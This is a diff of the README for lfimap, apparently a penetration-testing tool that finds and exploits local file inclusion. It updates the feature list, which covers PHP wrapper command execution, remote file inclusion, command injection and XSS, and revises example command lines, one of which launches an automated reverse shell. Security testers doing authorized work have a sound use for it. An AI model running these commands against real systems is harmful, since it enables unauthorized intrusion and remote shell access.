@@ -2,19 +2,20 @@
 ## Local file inclusion discovery and exploitation tool
 
 ### Main features
-- data:// for remote code execution
-- expect:// for remote code execution
-- input:// for remote code execution
+- data:// for remote command execution
+- expect:// for remote command execution
+- input:// for remote command execution
 - filter:// for arbitrary file inclusion
 - file:// for arbitrary file inclusion
 - Remote file inclusion for code execution
+- Path truncation for arbitrary file inclusion
+- Command injection for remote command execution
 - Reflected XSS testing
-- Absolute and relative path truncation for file inclusion
 - Option to test POST arguments
 - Option to specify custom http headers
 - Option to specify cookies for authenticated requests
 - Option to specify a web proxy to send requests through
-- Option for automated reverse shell attack upon RCE detection
+- Option for automated reverse shell attack upon code execution detection
 
 ### Documentation
 - [Installation](https://github.com/hansmach1ne/lfimap/wiki/Installation)
@@ -74,20 +75,22 @@ OTHER:
 ### Examples 
 
 #### 1) All attacks with '-a' (filter, input, data, expect and file wrappers, remote file inclusion, command injection, XSS, error disclosure).
-`python3 lfimap.py http://IP/vuln.php?param=PWN -C "PHPSESSID=XXXXXXXX" -a`  
+`python3 lfimap.py -U "http://IP/vuln.php?param=PWN" -C "PHPSESSID=XXXXXXXX" -a`  
 
-![all_attacks](https://user-images.githubusercontent.com/57464251/169725893-d1c898a2-86ef-497a-936d-dbbe5bc154a4.png)
+![1](https://user-images.githubusercontent.com/57464251/175751020-1528a8a6-acd5-4bb9-933c-31145c06df89.png)
 
 
-#### 2) Reverse shell command execution attack with '-x'.
-`python3 lfimap.py http://IP/vuln.php?param=PWN -C "PHPSESSID=XXXXXXXX" -a --lhost IP --lport PORT -x`  
+#### 2) Reverse shell command execution attack with '-x'
+`python3 lfimap.py -U "http://IP/vuln.php?param=PWN" -C "PHPSESSID=XXXXXXXX" -a --lhost IP --lport PORT -x`  
 
-![rev_shell](https://user-images.githubusercontent.com/57464251/169725946-7565eb46-c896-40c6-8bfc-8e24c840419d.png)
+![2](https://user-images.githubusercontent.com/57464251/175751030-c35ee579-b91e-4e42-85b1-56e97b00d768.png)
 
-#### 3) Post argument testing with '-D'. 
-`python3 lfimap.py http://IP/index.php -D "param=PWN" -a`
 
-![postreq_test](https://user-images.githubusercontent.com/57464251/169726000-89d4e66a-8ddc-4598-941a-710dc8f4db51.png)
+#### 3) Post argument testing with '-D'
+
+`python3 lfimap.py -U "http://IP/index.php" -D "page=PWN" -a`
+
+![3](https://user-images.githubusercontent.com/57464251/175751045-8f0faac8-75b1-44ce-a41a-f3f6a4076669.png)
 
 
 If you notice any issues with the software, please open up an issue. I will gladly take a look at it and try to resolve it. <br>
